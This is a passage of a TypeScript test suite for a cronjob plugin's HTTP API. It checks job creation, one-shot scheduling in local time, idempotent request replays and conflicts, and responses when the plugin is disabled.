  it('answers 503 "cronjob plugin is disabled" when the plugin is off', async () => {
    const { app, adminTok } = setup({ enabled: [] });
    const res = await app.request('/plugins/cronjob/jobs', auth(adminTok));
    expect(res.status).toBe(503);
    expect(await res.json()).toEqual({ error: 'cronjob plugin is disabled' });
  });
});

// The discord channels route and the msteams app-package route both moved to the plugin registry with
// their plugins. What they proved about the CORE — that a declared root mount of a DISABLED plugin
// answers 503 rather than a bare 404 — is proved above by the cronjob routes, which take the identical
// path through pluginApi.

// The web's first-class creation flow: an explicit POST with a browser-minted requestId, filed where
// its ownership implies, with the SERVER resolving a one-shot's local wall clock.
const postJob = (t: string, body: unknown) => ({ method: 'POST', headers: { authorization: `Bearer ${t}`, 'content-type': 'application/json' }, body: JSON.stringify(body) });

describe('cron job creation POST', () => {
  it('creates a filed recurring job (201) with revision 1 and requires it to name filing', async () => {
    const { app, dataRoot, adminTok } = setup();
    const ok_body = { requestId: 'r-1', lifecycle: 'recurring', scope: 'personal', name: 'digest', schedule: 'daily 06:00', prompt: 'Summarize the day.', conversationSessionId: STUB_CONVERSATION_ID };
    const res = await app.request('/plugins/cronjob/jobs', postJob(adminTok, ok_body));
    expect(res.status).toBe(201);
    const body = await res.json() as Record<string, unknown>;
    expect(body).toEqual(expect.objectContaining({ ok: true, revision: 1 }));
    expect((body.job as Record<string, unknown>).id).toBeTruthy();
    expect(onDisk(dataRoot)[0]).toMatchObject({
      name: 'digest', schedule: 'daily 06:00',
      conversationKey: `ns-${STUB_CONVERSATION_ID}`, revision: 1,
    });
    const noFiling = { ...ok_body, requestId: 'r-2', conversationSessionId: undefined };
    const res2 = await app.request('/plugins/cronjob/jobs', postJob(adminTok, noFiling));
    expect(res2.status).toBe(400);
    expect((await res2.json() as Record<string, unknown>).field).toBe('conversationSessionId');
  });

  it('creates a one-shot from a local wall clock server-side, and rejects filing on it', async () => {
    const { app, dataRoot, adminTok } = setup();
    const before = Date.now();
    const res = await app.request('/plugins/cronjob/jobs', postJob(adminTok, {
      requestId: 'r-2', lifecycle: 'oneShot', scope: 'personal', name: 'wakeup',
      prompt: 'check the deploy', localRunAt: { date: '2099-01-02', time: '10:30' },
    }));
    expect(res.status).toBe(201);
    const body = await res.json() as Record<string, unknown>;
    expect((body.job as Record<string, unknown>).lifecycle).toBe('oneShot');
    const stored = onDisk(dataRoot)[0] as Record<string, unknown>;
    expect(stored.runAt).toBeTruthy();
    expect(Number.isNaN(Date.parse(String(stored.runAt)))).toBe(false);
    expect(Date.now()).toBeGreaterThanOrEqual(before);
    // A filing conversation is NEVER accepted on a one-shot.
    const res2 = await app.request('/plugins/cronjob/jobs', postJob(adminTok, {
      requestId: 'r-3', lifecycle: 'oneShot', scope: 'personal', name: 'w', prompt: 'p',
      localRunAt: { date: '2099-01-02', time: '10:00' }, conversationSessionId: STUB_CONVERSATION_ID,
    }));
    expect(res2.status).toBe(400);
    expect(((await res2.json()) as Record<string, unknown>).code).toBe('invalid_request');
  });

  it('replays a retried requestId idempotently and conflicts on a different payload', async () => {
    const { app, adminTok } = setup();
    const body = { requestId: 'rr', lifecycle: 'oneShot', scope: 'personal', name: 'w', prompt: 'p', localRunAt: { date: '2099-01-02', time: '10:00' } };
    const first = await app.request('/plugins/cronjob/jobs', postJob(adminTok, body));
    expect(first.status).toBe(201);
    const created = await first.json() as Record<string, unknown>;
    const replay = await app.request('/plugins/cronjob/jobs', postJob(adminTok, { ...body }));
    expect(replay.status).toBe(200);
    expect(((await replay.json()) as Record<string, unknown>)).toEqual(expect.objectContaining({
      ok: true, idempotentReplay: true, jobId: ((created as Record<string, unknown>).job as Record<string, unknown>).id,
    }));
    const conflict = await app.request('/plugins/cronjob/jobs', postJob(adminTok, { ...body, name: 'different' }));
    expect(conflict.status).toBe(409);
    expect(((await conflict.json()) as Record<string, unknown>).code).toBe('idempotency_conflict');
  });

  it('a one-shot whose local time does not exist in the timezone refuses nonexistent_local_time', async () => {
    const { app, dataRoot, adminTok } = setup();
    const res = await app.request('/plugins/cronjob/jobs', postJob(adminTok, {
      requestId: 'r-gap', lifecycle: 'oneShot', scope: 'personal', name: 'w', prompt: 'p',
      localRunAt: { date: '2026-03-29', time: '02:30' },
    }));
    expect(res.status).toBe(400);
    const body = await res.json() as Record<string, unknown>;
    expect(body).toEqual(expect.objectContaining({ code: 'nonexistent_local_time', field: 'localRunAt' }));
    expect(existsSync(join(dataRoot, 'cronjob', 'jobs.json'))).toBe(false);
  });

  it('a queued or answered manual run replays idempotently and a different id conflicts', async () => {
    const { app, dataRoot, adminTok } = setup();
    seed(dataRoot, [{ ...job({ id: 'm1', schedule: 'daily 23:59' }), lastRun: new Date().toISOString() }]);
    const runBody = (id: string) => ({ method: 'POST', headers: { authorization: `Bearer ${adminTok}`, 'content-type': 'application/json' }, body: JSON.stringify({ requestId: id }) });
    // The harness runs WITHOUT a brain handler, so a NEW request cannot queue: it reads 503.
    expect((await app.request('/plugins/cronjob/jobs/m1/run', runBody('mr-1'))).status).toBe(503);
    expect(onDisk(dataRoot)[0]).not.toHaveProperty('manualRequest');
    // A queued durable request answers idempotently for its OWN requestId — even while the scheduler
    // is down — and a different one conflicts.
    const previouslyQueued = [{ ...job({ id: 'm2', schedule: 'daily 23:59' }), manualRequest: { id: 'mr-9', requestedAt: new Date().toISOString() } }];
    seed(dataRoot, [
      { ...job({ id: 'm1', schedule: 'daily 23:59' }), lastRun: new Date().toISOString(), manualRequest: { id: 'mr-1', requestedAt: new Date().toISOString() } },
      ...previouslyQueued,
    ]);
    expect((await app.request('/plugins/cronjob/jobs/m1/run', runBody('mr-1'))).status).toBe(202);
    expect((await app.request('/plugins/cronjob/jobs/m1/run', runBody('mr-2'))).status).toBe(409);
    // An ANSWERED requestId never runs twice, whatever the queue state now.
    const answered = [{ ...job({ id: 'm3', schedule: 'daily 23:59' }), lastManualRequestId: 'mr-7' }];
    seed(dataRoot, [...previouslyQueued, ...answered]);
    expect((await app.request('/plugins/cronjob/jobs/m3/run', runBody('mr-7'))).status).toBe(202);
  });
});
